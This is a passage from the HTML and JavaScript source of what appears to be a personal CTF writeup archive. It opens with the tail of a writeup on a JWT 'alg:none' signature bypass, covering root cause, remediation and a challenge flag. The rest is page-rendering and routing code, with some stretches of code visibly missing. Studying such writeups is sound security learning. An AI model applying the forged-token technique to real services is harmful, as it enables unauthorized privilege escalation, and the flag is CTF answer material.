displayed.</li>\n</ol>\n<hr />\n<h2 id=\"root-cause\">Root Cause</h2>\n<p><strong>CWE-347: Improper Verification of Cryptographic Signature.</strong> The backend selects its verification logic based on the <code>alg</code> field of the incoming (attacker-controlled) token instead of enforcing one fixed algorithm server-side. Since <code>none</code> was accepted, any payload — including elevated roles — could be forged with zero knowledge of the signing secret. This is the classic 2015-era <code>alg:none</code> JWT bug; modern libraries now reject <code>none</code> by default and require explicit algorithm allow-listing.</p>\n<hr />\n<h2 id=\"remediation\">Remediation</h2>\n<ul>\n<li>Hardcode accepted algorithms server-side (e.g. <code>algorithms=[&quot;HS256&quot;]</code>), reject everything else including <code>none</code>.</li>\n<li>Never let the token&#x27;s own header decide how it&#x27;s verified.</li>\n<li>Treat JWT claims as untrusted until signature verification passes on every protected route.</li>\n</ul>\n<p><strong>Flag:</strong> <code>FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}</code></p>"}];

// Sidebar generator
function renderSidebar() {
  const container = document.getElementById("sidebar-categories");
  container.innerHTML = "";

  // Group by category
  const catMap = {};
  challenges.forEach(c => {
    if (!catMap[c.category]) catMap[c.category] = [];
    catMap[c.category].push(c);
  });

  const sortedCats = Object.keys(catMap).sort();
  sortedCats.forEach(cat => {
    const label = document.createElement("div");
    label.className = "nav-label";
    label.textContent = cat;
    container.appendChild(label);

    catMap[cat].forEach(c => {
      const item = document.createElement("div");
      item.className = "nav-item";
      item.dataset.route = "#/w/" + c.id;
      item.innerHTML = `<span class="ic">${c.icon}</span><span class="nav-item-title">${c.title}</span>`;
      item.title = `${c.event} — ${c.title}`;
      item.tabIndex = 0;
      item.setAttribute("role", "link");
      item.addEventListener("keydown", (e) => {
        if (e.key === "Enter" || e.key === " ") {
          e.preventDefault();
          location.hash = item.dataset.route;
        }
      });
      container.appendChild(item);
    });
  });
}

// Home page renderer

      c.event.toLowerCase().includes(q) ||
      c.category.toLowerCase().includes(q) ||
      c.flag.toLowerCase().includes(q) ||
      c.challenge.toLowerCase().includes(q)
    );
  }

  const rows = list.map(c => `
    <tr onclick="location.hash='#/w/${c.id}'" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();location.hash='#/w/${c.id}';}" tabindex="0" role="link" aria-label="Open writeup: ${c.title}">
      <td class="ev-name"><span class="ic">${c.icon}</span>${c.title}</td>
      <td>${c.category}</td>
      <td>${c.event}</td>
      <td>${c.target || c.difficulty || '—'}</td>
      <td class="flagcell">${c.flag || '—'}</td>

  return `
    <div class="col-main">
      <h1 class="page-title">🚩 CTF Archive — Writeups</h1>
      <hr class="divider">
      <div class="whoami">
        <div><span class="whoami-prompt">manan@ctf-archive</span><span class="whoami-path">:~$</span> whoami</div>
        <div class="whoami-out">Manan Modi — cybersecurity student @ NFSU, Gandhinagar. Focused on VAPT, red teaming, and CTFs.</div>
      </div>
      <p class="lede">A personal collection of verified Capture The Flag writeups — full methodology, working exploit scripts, reverse engineering steps, and root-cause analyses.</p>
      <p>Browse challenges across multiple CTF events by category in the sidebar, or filter by keyword using the search bar above. Click any challenge to open the complete solution writeup.</p>

      <div class="stat-row">
        <div class="card"><div class="num">${challenges.length}</div><div class="lbl">Total Writeups</div></div>
        <div class="card"><div class="num">${categoriesCount}</div><div class="lbl">Categories</div></div>
        <div class="card"><div class="num">${capturedCount}</div><div class="lbl">Flags Captured</div></div>
        <div class="card"><div class="num">${eventsCount}</div><div class="lbl">Events</div></div>
      </div>

      <h2 class="section-title">All Challenges (${list.length})</h2>
      <div class="table-wrap">
        <table>
          <thead>
            <tr>
              <th>Challenge</th>
              <th>Category</th>
              <th>Event</th>
              <th>Target / Diff</th>
              <th>Flag</th>
            </tr>
          </thead>
          <tbody>
            ${rows || '<tr><td colspan="5" style="text-align:center;padding:24px;color:var(--ink-soft)">No matching writeups found.</td></tr>'}
          </tbody>
        </table>
      </div>
    </div>
  `;
}

// Writeup page renderer
function renderWriteup(c) {
  // Extract h2 headings for TOC
  const tempDiv = document.createElement("div");
  tempDiv.innerHTML = c.body_html;
  const h2Elements = Array.from(tempDiv.querySelectorAll("h2"));
  const tocItems = h2Elements.map(h => ({
    id: h.id || h.textContent.toLowerCase().replace(/[^a-z0-9]+/g, '-'),
    text: h.textContent
  }));

  const metaItems = [
    `<div>CATEGORY: <b>${c.category}</b></div>`,
    `<div>EVENT: <b>${c.event}</b></div>`,
    c.target ? `<div>TARGET: <b>${c.target}</b></div>` : '',
    c.difficulty ? `<div>DIFFICULTY: <b>${c.difficulty}</b></div>` : '',
    c.points ? `<div>POINTS: <b>${c.points}</b></div>` : '',
    `<div>STATUS: <b style="color:var(--green)">${c.flag ? 'Captured' : 'Solved'}</b></div>`
  ].filter(Boolean).join("");

  const promptBlock = c.prompt ? `
    <div class="desc-box">
      <strong>Challenge Prompt:</strong>
      <p>${c.prompt}</p>
    </div>
  ` : "";

  const flagBox = c.flag ? `
    <div class="flag-box">
      <div class="tag">FLAG</div>
      <div class="val">${c.flag}</div>
      <button class="copy-btn" data-copy="${c.flag}">COPY</button>
    </div>
  ` : "";

  return `
    <div class="col-main">
      <span class="back-link" onclick="location.hash='#/'" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();location.hash='#/';}" tabindex="0" role="link">← Back to Archive</span>
      <div class="cat-label">${c.category} • ${c.event}</div>
      <h3 class="writeup-title">${c.icon} ${c.title}</h3>
      <div class="meta-row">
        ${metaItems}
      </div>
      ${promptBlock}
      <div class="writeup-body">
        ${c.body_html}
      </div>
      ${flagBox}
    </div>
    <div class="col-toc">
      <div class="toc-head">On This Page</div>
      ${tocItems.map(t => `<a class="toc-link" href="#${t.id}" onclick="event.preventDefault(); document.getElementById('${t.id}')?.scrollIntoView({behavior:'smooth'});">${t.text}</a>`).join("") || '<span style="font-size:12px;color:var(--ink-soft);font-style:italic">No subheadings</span>'}
    </div>
  `;
}

function updateActiveNav() {
  const hash = location.hash || "#/";
  document.querySelectorAll(".nav-item[data-route]").forEach(n => {
    const isActive = n.dataset.route === hash;
    n.classList.toggle("active", isActive);
    if (isActive) n.setAttribute("aria-current", "page");
    else n.removeAttribute("aria-current");
  });
}

function initCopyButtons() {
  document.querySelectorAll(".copy-btn").forEach(btn => {
    btn.onclick = () => {
      let text = btn.dataset.copy;
      if (!text) {
        const block = btn.closest(".code-block");
        if (block) {
          const pre = block.querySelector("pre");
          if (pre) text = pre.innerText;
        }
      }
      if (text) {
        navigator.clipboard.writeText(text).then(() => {
          btn.textContent = "COPIED";
          btn.classList.add("copied");
          setTimeout(() => {
            btn.textContent = "COPY";
            btn.classList.remove("copied");
          }, 1200);
        }).catch(() => {});
      }
    };
  });
}

function initTocScrollSpy() {
  const headings = Array.from(document.querySelectorAll(".col-main h2"));
  const links = Array.from(document.querySelectorAll(".toc-link"));
  if (!headings.length || !links.length) return;

  const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const id = entry.target.id;
        links.forEach(l => {
          const targetId = l.getAttribute("onclick")?.match(/'([^']+)'/)?.[1];
          l.classList.toggle("active", targetId === id);
        });
      }
    });
  }, { rootMargin: "-10% 0px -75% 0px" });

  headings.forEach(h => observer.observe(h));
}

function route() {
  const hash = location.hash || "#/";
  const content = document.getElementById("content");
  if (hash.startsWith("#/w/")) {
    const id = hash.replace("#/w/", "");
    const c = challenges.find(item => item.id === id) || challenges[0];
    content.innerHTML = renderWriteup(c);
    document.title = `${c.title} — CTF Archive`;
    window.scrollTo(0, 0);
  } else {
    const searchVal = document.getElementById("search-input").value;
    content.innerHTML = renderHome(searchVal);
    document.title = "🚩 CTF Archive — Writeups";
  }
  updateActiveNav();
  initCopyButtons();
  initTocScrollSpy();
}

    document.getElementById("content").innerHTML = renderHome(e.target.value);
    initCopyButtons();
  } else {
    location.hash = "#/";
    setTimeout(() => {
      document.getElementById("content").innerHTML = renderHome(e.target.value);
      initCopyButtons();
    }, 50);
  }
});

window.addEventListener("hashchange", route);

// Initialize
renderSidebar();
route();
</script>
</body>
</html>
